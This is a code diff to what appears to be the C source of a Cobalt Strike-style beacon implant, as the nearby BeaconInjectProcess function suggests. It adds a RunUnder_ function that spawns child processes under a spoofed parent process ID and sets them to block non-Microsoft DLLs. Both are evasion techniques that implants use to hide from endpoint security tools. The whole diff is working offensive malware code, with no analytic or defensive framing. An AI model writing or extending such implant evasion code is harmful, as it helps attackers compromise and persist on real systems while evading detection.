@@ -1158,6 +1158,58 @@ BOOL RunProcessWithAdjustedCmd(RUN_UNDER_CONFIG* execution)
 	return result;
 }
 
+BOOL RunUnder_(RUN_UNDER_CONFIG* runUnderConfig, int parentPid)
+{
+
+	DWORD count = 0;
+	if (parentPid)
+		count++;
+
+	if (gBlockDlls)
+		count++;
+
+	if (count == 0)
+		return RunProcessWithAdjustedCmd(runUnderConfig);
+
+	const PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = ProcThreadAttributeListInit(count);
+
+	RUN_UNDER_CONTEXT context;
+	RUN_UNDER_CONTEXT parentContext = *ParentProcessContextInit(&context);
+	RUN_UNDER_CONTEXT childContext = *ChildProcessContextInit(&context);
+
+	BOOL result = FALSE;
+
+	if (!parentPid || parentContext.updateProcessAttributes(
+		&parentContext,
+		parentPid,
+		lpAttributeList,
+		runUnderConfig->startupInfo))
+	{
+		if (!gBlockDlls
+			|| childContext.updateProcessAttributes(&childContext, parentPid, lpAttributeList, runUnderConfig->startupInfo))
+		{
+			STARTUPINFOEXA si_;
+			si_.StartupInfo = *runUnderConfig->startupInfo;
+			si_.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+			si_.lpAttributeList = lpAttributeList;
+			runUnderConfig->startupInfo = &si_;
+			runUnderConfig->creationFlags |= EXTENDED_STARTUPINFO_PRESENT;
+
+			result = RunProcessWithAdjustedCmd(runUnderConfig);
+
+			if (parentPid)
+				parentContext.cleanup(&parentContext);
+
+			if (gBlockDlls)
+				childContext.cleanup(&childContext);
+		}
+	}
+
+	ProcThreadAttributeListDestroy(lpAttributeList);
+
+	return result;
+}
+
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
